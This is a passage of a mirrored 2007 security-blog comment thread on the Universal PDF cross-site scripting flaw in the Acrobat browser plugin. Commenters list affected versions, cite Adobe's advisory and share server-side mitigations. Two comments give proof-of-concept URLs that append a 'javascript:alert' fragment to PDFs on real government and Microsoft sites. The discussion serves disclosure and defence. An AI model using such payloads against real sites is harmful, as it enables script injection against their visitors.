+		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1885">
+			January 4, 2007 at 11:32 pm</a>		</div>
+
+		<p>update from <a href="http://www.memestreams.net/users/acidus/blogid71740/" rel="nofollow">acidus</a></p>
+<ul>
+<li>IE6 + Acrobat Reader 4 + XP SP2</li>
+<li>IE6 + Acrobat Reader 6 + XP SP2</li>
+<li>IE6 + Acrobat Reader 7 + XP SP1</li>
+<li>(possibly) IE 6 on non-XP platforms</li>
+<li>Firefox 2.0.0.1</li>
+<li>Firefox 1.5.0.8</li>
+<li>Opera 8.5.4 build 770</li>
+<li>Opera 9.10.8679</li>
+</ul>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-1894">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/8e5aacda3a9270e4a9350eee2087765e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://technocrati.ca/2007/01/04/pretty-simple-fix-for-the-recent-acrobat-pdf-vulnerability/' rel='external nofollow' class='url'>darron</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1894">
+			January 5, 2007 at 2:11 am</a>		</div>
+
+		<p>What about forcing the PDF to download instead of displaying it in the browser with the plugin? Kind of like <a href="http://technocrati.ca/2007/01/04/pretty-simple-fix-for-the-recent-acrobat-pdf-vulnerability/" rel="nofollow">this.</a></p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-1901">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/120f6678dc7990a340d3ad465602bfd3?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://weblogs.macromedia.com/jd' rel='external nofollow' class='url'>John Dowdell</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1901">
+			January 5, 2007 at 6:02 am</a>		</div>
+
+		<p>Hi, I&#8217;m sorry for the wait on this, but the Adobe Security Group has the full advisory published now: <a href="http://www.adobe.com/support/security/advisories/apsa07-01.html" rel="nofollow">http://www.adobe.com/support/s.....07-01.html</a></p>
+<p>If you&#8217;ve updated your internet software since last autumn then you&#8217;re already covered, with the free Adobe Reader 8. (This info was available in Stefano &amp; Giorgio&#8217;s initial paper, and in the CERT advisory.)</p>
+<p>As Leonard advised, patches for those who cannot update to the current version (old OS, locked intranet etc) are expected for download next week.</p>
+<p>tx, jd/adobe</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-1928">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/93ee15dd096bc7bee7a679c102186853?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">James Pulver</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1928">
+			January 5, 2007 at 3:29 pm</a>		</div>
+
+		<p>I can&#8217;t get this to work in FF 2.0.0.1 with Acrobat Reader 7.0.5 or in Opera 9.10 &#8230;<br />
+Does this only work if you use the plugin?</p>
+<p>I have both set to open in Acrobat Reader, so I get a download box, and then Acrobat Reader opens up&#8230;</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-admin odd alt thread-odd thread-alt depth-1" id="comment-1930">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1930">
+			January 5, 2007 at 3:40 pm</a>		</div>
+
+		<p>this is because Google fixed it by adding the following header to the response:</p>
+<pre><code>Content-disposition: attachement filename=filename_of_the_document.pdf</code></pre>
+<p>try</p>
+<pre><code><a href="http://www.foia.cia.gov/2020/2020.pdf#something=javascript:alert('xss');" rel="nofollow"></a><a href="http://www.foia.cia.gov/2020/2020.pdf#something=javascript:alert(&#039;xss" rel="nofollow">http://www.foia.cia.gov/2020/2.....(&#039;xss</a>');</code></pre>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-1937">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/93ee15dd096bc7bee7a679c102186853?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://deleted/' rel='external nofollow' class='url'>James Pulver</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1937">
+			January 5, 2007 at 4:51 pm</a>		</div>
+
+		<p>Still no popup in Opera 9.10. Got it in FF2.0.0.1.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-1938">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/a864386307ab2bd1f284024b9de2af05?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Ankit Singla</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1938">
+			January 5, 2007 at 5:06 pm</a>		</div>
+
+		<p>Running FFx 2 and Reader 8, I got an alert that said &#8220;This operation is not allowed&#8221; and then the adobe pdf file opened correctly using the second link. The first link doesn&#8217;t tell the browser it&#8217;s a pdf so it didn&#8217;t open using the plugin.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-1940">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/2439fcc9b49533342befb7391ef74823?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://kentbrewster.com/' rel='external nofollow' class='url'>Kent Brewster</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1940">
+			January 5, 2007 at 5:54 pm</a>		</div>
+
+		<p>To help mitigate this problem at the server end, the following <a href="http://httpd.apache.org/docs/1.3/misc/rewriteguide.html" rel="nofollow">Apache URL rewrite</a> rules:</p>
+<pre><code>RewriteCond %{HTTP_HOST} ^.*yourdomain\.com$ [NC]
+RewriteRule ^(.*\.pdf)$ http:&#47;&#47;%{SERVER_ADDR}$1 [NC,R]</code></pre>
+<p>&#8230; should redirect requests for PDFs hosted here:</p>
+<pre><code>yourdomain.com/yourdir/your.pdf</code></pre>
+<p>&#8230; to here:</p>
+<p>youripaddress/yourdir/your.pdf</p>
+<p>Since you&#8217;re probably setting cookies on your domain and not your IP address, most XSS approaches should hit a wall.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-1948">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/c17a33e9b94e7f2ddb0852574d0d24dc?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Dixie Scott</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1948">
+			January 5, 2007 at 9:50 pm</a>		</div>
+
+		<p>I have Windows 2000 Professional, IE6, Acrobat Reader 4.0.  Does this affect me?  I have my bank online and pay bills online with my checking acct.  Am a student online also.  Should I delete it?  Cannot get higher version with win2k.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-1981">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/997a9fa55e557e2aa8262a07758b161d?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://websecurity.com.ua/' rel='external nofollow' class='url'>MustLive</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-1981">
+			January 6, 2007 at 4:47 pm</a>		</div>
+
+		<blockquote><p>BTW, on Window PRO SP 2, only FF is vulnerable.</p></blockquote>
+<p>Not just FF, but also Mozilla which I use (Mozilla 1.7.7) also have this issue.</p>
+<p>On Win XP Pro SP2 (and most probably XP HE also as previous Windows XP, such as Gold and SP1).</p>
+<p>Just need Acrobat plugin installed in your browser.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-2043">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/997a9fa55e557e2aa8262a07758b161d?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://websecurity.com.ua/' rel='external nofollow' class='url'>MustLive</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-2043">
+			January 7, 2007 at 9:21 pm</a>		</div>
+
+		<p>It is realy danger and widespread vulnerability, boys. </p>
+<p>The are up to 317 000 000 sites over the Web which have pdf files (as Google said). And every admin of every site need to deal with this Universal PDF XSS.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-2245">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/8e6160e62ddb9a247dc141c5b41ae663?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">RDP</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-2245">
+			January 12, 2007 at 4:58 am</a>		</div>
+
+		<p>Using XP SP2,<br />
+FF 1.5.0.9,<br />
+PDF Downloader 0.7.6 and .8,<br />
+and AR 7.0.8 and now AR7.0.9 &#8211; </p>
+<p>Uh&#8230; no change. The CIA link above still pops the XSS windows with 7.0.9 (even after rebooting)</p>
+<p>Moving on to 8</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-admin odd alt thread-odd thread-alt depth-1" id="comment-2253">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-2253">
+			January 12, 2007 at 11:52 am</a>		</div>
+
+		<p>RDP, that&#8217;s interesting. Anyone getting similar results?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-2341">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/bf4b69eafc242baf2c11352394cfee85?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.fsf.org/' rel='external nofollow' class='url'>gnugpl</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-2341">
+			January 14, 2007 at 12:06 pm</a>		</div>
+
+		<p>I cannot reproduce the problem with xpdf and firefox on debian.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-2351">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/997a9fa55e557e2aa8262a07758b161d?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://websecurity.com.ua/' rel='external nofollow' class='url'>MustLive</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-2351">
+			January 14, 2007 at 6:25 pm</a>		</div>
+
+		<p>This is very widespread vulnerability. I have already written my own article about UXSS (in Ukrainian).</p>
+<p>And you may look at this example of such hole at microsoft&#8217;s site :-).</p>
+<p><a href="http://www.microsoft.com/windows2000/docs/TCO.pdf#xss=javascript:alert('XSS')" rel="nofollow"></a><a href="http://www.microsoft.com/windows2000/docs/TCO.pdf#xss=javascript:alert(&#039;XSS" rel="nofollow">http://www.microsoft.com/windo.....(&#039;XSS</a>&#8216;)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-123417">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/37bbd86400c357874df87c4ac096c9f2?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://imvucode.com/' rel='external nofollow' class='url'>SneakyWho_am_i</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-123417">
+			August 29, 2008 at 6:17 pm</a>		</div>
+
+		<p>At the time it would have meant that probably thousands of customers at my particular bank using IE6 and Firefox 2 were affected. While the number of vulnerable clients should be significantly lower now, I would still avoid offering PDFs in the vulnerable configuration at least until IE6 goes byebye, if it ever does. I think that a place like a bank simply could not afford to let even one or two customers log in affected by a bug of this magnitude, per year. Granted, banks probably have unique IDs on all their forms and yada yada yada&#8230; But every exploit you allow is a piece of the puzzle for a nice combined exploit that crumbles your bones to dust in the advent of Murphy&#8217;s Law. You can&#8217;t win forever et cetera et cetera&#8230;.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		</div>
+		
+		<div class="post-comments-navigation">
+			<div class="older-comments"></div>
+			<div class="newer-comments"></div>
+		</div>
+	
+	<div id="post-response">
+		<h2>Respond</h2>
+					<form action="http://www.gnucitizen.org/wordpress/wp-comments-post.php" name="response-form" method="post" class="response-form">
+				<p><em>We retain the right to remove any comment or trackback we determine to be, at our sole discretion, unacceptable.</em></p>
+									<div><label for="author">name: (required)</label></div>
+					<div><input type="text" name="author" id="author" value="" size="20" tabindex="1"/></div>
+					<div><label for="email">mail: (required)</label></div>
+					<div><input type="text" name="email" id="email" value="" size="20" tabindex="2"/></div>
+					<div><label for="url">website:</label></div>
+					<div><input type="text" name="url" id="url" value="" size="20" tabindex="3"/></div>
+								<div><label for="comment">comment:</label></div>
+				<div><textarea name="comment" id="comment" cols="50" rows="10" tabindex="4"></textarea></div>
+				<div>
+					<input class="button" name="submit" type="submit" id="submit" tabindex="5" value="submit"/>
+					<input class="button" name="reset" type="reset" id="reset" tabindex="6" value="reset"/>
+				</div>
+				<input type="hidden" name="comment_post_ID" value="135"/>
+				<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="68f3defdd1" /></p>
+
+	<p style="clear: both;" class="subscribe-to-comments">
+	<input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;" />
+	<label for="subscribe">Notify me of followup comments via e-mail</label>
+	</p>
+
+
+			</form>
+			</div>
+					</div>
+		<div id="content-sidebar">					<div class="widget">			<p style="font-size:24px"><em>Get <a href="http://www.websecurify.com/">Websecurify</a> - a cross-platform web security testing technology designed from the ground up with simplicity in mind.</em></p>			</div>			</div></div>
+
+				
+		<div id="footer">
+			
+	<script type="text/javascript">
+		var gaJsHost = (('https:' == document.location.protocol) ? 'https://ssl.' : 'http://www.');
+		document.write(unescape('%3Cscript src="' + gaJsHost + 'google-analytics.com/ga.js" type="text/javascript"%3E%3C/script%3E'));
+	</script>
+	<script type="text/javascript">
+		var pageTracker = _gat._getTracker('UA-363996-1');
+		pageTracker._initData();
+		pageTracker._trackPageview();
+	</script>
+
+				<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/" title="Creative Commons Attribution-Noncommercial-No Derivative Works 2.5 Generic">CC</a>)2005-2012 <a href="../../index.html" title="Information Security Think Tank">GNUCITIZEN</a></p>
+		</div>
+		
+		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+			<Work rdf:about="">
+				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/"/>
+				<dc:title>GNUCITIZEN</dc:title>
+				<dc:date>2005-2012</dc:date>
+				<dc:creator><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:creator>
+				<dc:rights><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:rights>
+				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text"/>
+				<dc:source rdf:resource="http://www.gnucitizen.org"/>
+			</Work>
+			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
+				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
+				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
+			</License>
+		</rdf:RDF> -->
+		
+		<!-- tested by blogsecurify -->
+		<!-- wpscanner -->
+	</body>
+
+<!-- Mirrored from www.gnucitizen.org/blog/danger-danger-danger/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 15:21:50 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+</html>
